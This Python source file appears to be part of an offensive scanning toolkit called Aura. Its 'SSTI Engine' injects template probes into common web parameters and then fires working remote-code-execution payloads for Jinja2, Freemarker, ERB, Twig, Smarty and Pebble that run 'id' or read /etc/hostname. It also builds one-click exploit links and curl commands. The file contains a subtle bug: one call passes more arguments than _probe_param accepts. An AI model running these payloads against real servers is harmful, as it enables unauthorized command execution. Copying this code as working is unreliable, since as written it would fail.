"""
Aura v28.0 — SSTI Engine 🧨
============================
Server-Side Template Injection detection and exploitation.
Supports: Jinja2, Twig, Freemarker, Smarty, ERB, Pebble, Velocity,
          Handlebars, Mako, Tornado, Django, Nunjucks

Strategy:
1. Mathematical probe injection ({{7*7}}, ${7*7}, etc.)
2. Engine fingerprinting via unique expressions
3. Non-destructive RCE confirmation (reads /etc/hostname or env var)
4. PoC generation per engine type
"""
import asyncio
import re
import itertools
import urllib.parse
from rich.console import Console
from aura.core import state

console = Console()


# ── Probe payloads per engine ──────────────────────────────────────────────
SSTI_PROBES = [
    # (payload, expected_result_pattern, engine_hint)
    ("{{7*7}}", "49", "Jinja2/Twig/Nunjucks"),
    ("${7*7}", "49", "Freemarker/Spring/Groovy"),
    ("#{7*7}", "49", "Thymeleaf/Ruby"),
    ("<%= 7*7 %>", "49", "ERB/Mako"),
    ("{{7*'7'}}", "7777777", "Jinja2"),               # Jinja2 specific
    ("${{7*7}}", "49", "Pebble/Freemarker"),
    ("{7*7}", "49", "Smarty"),
    ("{php}echo 7*7;{/php}", "49", "Smarty"),
    ("@(7*7)", "49", "Razor/.NET"),
    ("*{7*7}", "49", "Spring Expression"),
    ("[[${7*7}]]", "49", "Thymeleaf"),
]

# Engine-specific RCE payloads (non-destructive: read hostname or env)
SSTI_RCE_PROBES = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/hostname').read()}}",
        "{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
    ],
    "Freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    ],
    "ERB": [
        "<%= `id` %>",
        "<%= system('id') %>",
    ],
    "Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "Smarty": [
        "{system('id')}",
        "{php}system('id');{/php}",
    ],
    "Pebble": [
        "{% set cmd = 'id' %}{{ runtime.exec(cmd) }}",
    ],
}

RCE_CONFIRM_PATTERN = re.compile(r'uid=\d+|root|hostname|HOSTNAME', re.IGNORECASE)


class SSTIEngine:
    """
    v28.0: Server-Side Template Injection Scanner.
    Detects SSTI vulnerabilities and attempts non-destructive RCE confirmation.
    """

    def __init__(self, session=None):
        self.session = session

    async def _probe_param(self, client, url: str, param: str, probe_template: str,
                           engine: str) -> dict | None:
        """v25.0 OMEGA: Deterministic SSTI Proof with WAF-Reflection Guard."""
        import random
        a, b = random.randint(10, 99), random.randint(10, 99)
        expected = str(a * b)
        probe = probe_template.replace("7*7", f"{a}*{b}")

        # WAF/Noise Signatures to avoid FPs from reflected parameters in error pages
        WAF_SIGS = ["cloudflare", "attention required", "ray id", "security challenge", 
                    "captcha", "blocked", "incident id", "firewall", "403 forbidden"]

        try:
            # GET injection
            r = await client.get(url, params={param: probe}, timeout=10)
            text_lower = r.text.lower()
            
            # --- Anti-FP Check: WAF Reflection Guard ---
            if expected in r.text:
                if any(sig in text_lower for sig in WAF_SIGS):
                    return None # Likely a reflected parameter in a WAF block page

                # DOUBLE-BLIND VERIFICATION
                c, d = random.randint(10, 99), random.randint(10, 99)
                expected_v = str(c * d)
                probe_v = probe_template.replace("7*7", f"{c}*{d}")
                
                rv = await client.get(url, params={param: probe_v}, timeout=10)
                if expected_v in rv.text:
                    if any(sig in rv.text.lower() for sig in WAF_SIGS):
                        return None

                    # REFLECTION CHECK
                    if probe_v in rv.text:
                        # If raw payload is reflected literally, it's not execution
                        return None

                    return {"url": url, "param": param, "probe": probe,
                            "expected": expected, "engine": engine,
                            "response_snippet": r.text[:500]}

            # POST injection
            r = await client.post(url, data={param: probe}, timeout=10)
            text_lower = r.text.lower()
            if expected in r.text:
                if any(sig in text_lower for sig in WAF_SIGS): return None

                c, d = random.randint(10, 99), random.randint(10, 99)
                expected_v = str(c * d)
                probe_v = probe_template.replace("7*7", f"{c}*{d}")
                rv = await client.post(url, data={param: probe_v}, timeout=10)
                
                if expected_v in rv.text:
                    if any(sig in rv.text.lower() for sig in WAF_SIGS): return None
                    if probe_v in rv.text: return None

                    return {"url": url, "param": param, "probe": probe,
                            "expected": expected, "engine": engine,
                            "response_snippet": r.text[:500], "method": "POST"}
        except Exception:
            pass
        return None

    async def _confirm_rce(self, client, url: str, param: str,
                           engine_hint: str, method: str = "GET") -> str | None:
        """Attempts non-destructive RCE to confirm exploitability."""
        payloads = SSTI_RCE_PROBES.get(engine_hint, [])
        # Also try generic Jinja2 since it's most common
        if engine_hint not in SSTI_RCE_PROBES:
            payloads = SSTI_RCE_PROBES.get("Jinja2", [])

        for payload in payloads:
            try:
                if method == "POST":
                    r = await client.post(url, data={param: payload}, timeout=10)
                else:
                    r = await client.get(url, params={param: payload}, timeout=10)

                match = RCE_CONFIRM_PATTERN.search(r.text)
                if match:
                    return f"RCE Confirmed: `{match.group(0)}` found in response. Payload: {payload}"
            except Exception:
                continue
        return None

    async def scan_url(self, url: str, params: list = None) -> list:
        """
        Scans a single URL for SSTI across all detectable parameters.
        Returns a list of confirmed finding dicts.
        """
        findings = []
        test_params = params or ["q", "search", "name", "input", "query",
                                  "text", "content", "template", "data",
                                  "msg", "message", "title", "lang", "id"]

        async with __import__("httpx").AsyncClient(verify=False, follow_redirects=True) as client:
            sem = asyncio.Semaphore(10)

            async def _test_combo(param, probe_info):
                async with sem:
                    probe, expected, engine = probe_info
                    hit = await self._probe_param(client, url, param, probe, expected, engine)
                    if hit:
                        return hit
                return None

            tasks = [
                _test_combo(param, probe)
                for param in test_params
                for probe in SSTI_PROBES
            ]
            results = await asyncio.gather(*tasks)

            # Process hits — deduplicate by param
            seen = set()
            for hit in results:
                if hit is None:
                    continue
                sig = f"{hit['url']}_{hit['param']}"
                if sig in seen:
                    continue
                seen.add(sig)

                engine = hit["engine"].split("/")[0]  # primary engine
                console.print(
                    f"[bold red][🧨 SSTI] Injection confirmed! "
                    f"Engine: {hit['engine']} | param: `{hit['param']}` | URL: {hit['url']}[/bold red]"
                )

                # Attempt RCE confirmation
                method = hit.get("method", "GET")
                rce_result = await self._confirm_rce(client, hit["url"],
                                                      hit["param"], engine, method)

                severity = "CRITICAL" if rce_result else "HIGH"
                
                # Auto-Exploitation Phase 2: 1-Click PoC URL Generator
                poc_link = ""
                if method == "GET":
                    poc_link = f"{hit['url']}?{hit['param']}={urllib.parse.quote_plus(hit['probe'])}"
                else:
                    poc_link = f"curl -X POST -d '{hit['param']}={hit['probe']}' '{hit['url']}'"
                
                evidence = (
                    f"SSTI CONFIRMED: {hit['engine']} template injection\n"
                    f"URL: {hit['url']}\n"
                    f"Parameter: `{hit['param']}`\n"
                    f"Probe: {hit['probe']} → Expected: {hit['expected']}\n"
                    f"1-Click PoC: `{poc_link}`\n"
                    f"Response Snippet: {hit['response_snippet']}\n"
                )
                if rce_result:
                    evidence += f"\n🔥 RCE Confirmed: {rce_result}"
                    console.print(f"[bold red][🔥 RCE] {rce_result}[/bold red]")

                findings.append({
                    "type": f"SSTI ({hit['engine']})",
                    "finding_type": "Server-Side Template Injection (SSTI)",
                    "severity": severity,
                    "owasp": "A03:2021 – Injection",
                    "mitre": "T1059 – Command and Scripting Interpreter",
                    "content": evidence,
                    "url": url,
                    "confirmed": True,
                    "poc_evidence": evidence,
                    "poc_link": poc_link
                })

        return findings

    async def scan_urls(self, urls: list) -> list:
        """Scan multiple URLs for SSTI."""
        if not urls:
            return []
        console.print(f"[bold cyan][🧨 SSTI Engine] Scanning {len(urls)} endpoint(s) for template injection...[/bold cyan]")
        all_findings = []
        sem = asyncio.Semaphore(5)

        async def _scan_one(url):
            async with sem:
                return await self.scan_url(url)

        results = await asyncio.gather(*[_scan_one(u) for u in urls])
        for r in results:
            all_findings.extend(r)

        if all_findings:
            console.print(f"[bold red][🧨 SSTI] {len(all_findings)} injection(s) found![/bold red]")
        else:
            console.print("[dim][SSTI] No template injections detected.[/dim]")
        return all_findings
